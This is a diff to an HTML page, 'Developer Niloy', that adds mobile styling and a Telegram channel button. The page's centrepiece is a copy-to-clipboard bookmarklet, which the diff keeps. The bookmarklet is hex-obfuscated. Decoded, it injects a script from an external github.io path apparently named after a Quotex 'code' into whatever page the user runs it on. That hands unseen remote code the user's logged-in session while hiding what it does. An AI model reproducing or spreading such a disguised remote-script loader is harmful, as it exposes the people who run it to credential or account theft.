@@ -1,8 +1,9 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙽𝙸𝙻𝙾𝚈</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Mobile Responsive -->
   <style>
     body {
       margin: 0;
@@ -18,7 +19,7 @@
 
     .container {
       text-align: center;
-      padding: 40px;
+      padding: 30px;
       border-radius: 20px;
       background: rgba(255, 255, 255, 0.08);
       backdrop-filter: blur(20px);
@@ -30,7 +31,7 @@
     }
 
     h1 {
-      font-size: 2.5em;
+      font-size: 2.2em;
       margin-bottom: 20px;
       letter-spacing: 2px;
       background: linear-gradient(90deg, #ff00cc, #3333ff, #00ffcc);
@@ -70,6 +71,7 @@
       transition: 0.3s ease;
       position: relative;
       overflow: hidden;
+      display: inline-block;
     }
 
     button:hover {
@@ -77,7 +79,6 @@
       box-shadow: 0 0 20px rgba(255,255,255,0.6);
     }
 
-    /* টিক মার্ক এনিমেশন */
     .checkmark {
       display: none;
       font-size: 20px;
@@ -92,7 +93,6 @@
       100% { transform: scale(1); opacity: 1; }
     }
 
-    /* বুদবুদ এনিমেশন */
     .bubble {
       position: absolute;
       bottom: -100px;
@@ -106,15 +106,49 @@
       100% { transform: translateY(-120vh) scale(0.8); opacity: 0; }
     }
 
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .container {
+        padding: 20px;
+        max-width: 95%;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+      textarea {
+        height: 100px;
+        font-size: 13px;
+      }
+      button {
+        font-size: 14px;
+        padding: 10px 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 1.5em;
+      }
+      textarea {
+        height: 90px;
+        font-size: 12px;
+      }
+      button {
+        font-size: 13px;
+        padding: 8px 18px;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙽𝙸𝙻𝙾𝚈</h1>
-    <textarea id="bookmarklet">javascript:(function(){var _0x1a3e=["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x69\x61\x6D\x7A\x73\x61\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x51\x55\x4F\x54\x45\x58\x50\x43\x43\x4F\x4F\x44\x2F","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"];var x=document[_0x1a3e[0]]("script");x[_0x1a3e[1]]=_0x1a3e[2];document.body[_0x1a3e[3]](x);})();
-</textarea>
+    <textarea id="bookmarklet">javascript:(function(){var _0x1a3e=["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x69\x61\x6D\x7A\x73\x61\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x51\x55\x4F\x54\x45\x58\x50\x43\x43\x4F\x4F\x44\x2F","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"];var x=document[_0x1a3e[0]]("script");x[_0x1a3e[1]]=_0x1a3e[2];document.body[_0x1a3e[3]](x);})();</textarea>
     <br>
     <button onclick="copyCode()">Copy Bookmarklet</button>
+    <br>
+    <!-- New Telegram Button -->
+    <button onclick="window.location.href='https://t.me/ni9bd'">Join Telegram</button>
     <div id="check" class="checkmark">✔ Copied!</div>
   </div>
 
@@ -133,7 +167,6 @@
       }, 1500);
     }
 
-    // বুদবুদ জেনারেট
     function createBubble() {
       const bubble = document.createElement("div");
       const size = Math.random() * 40 + 10; 
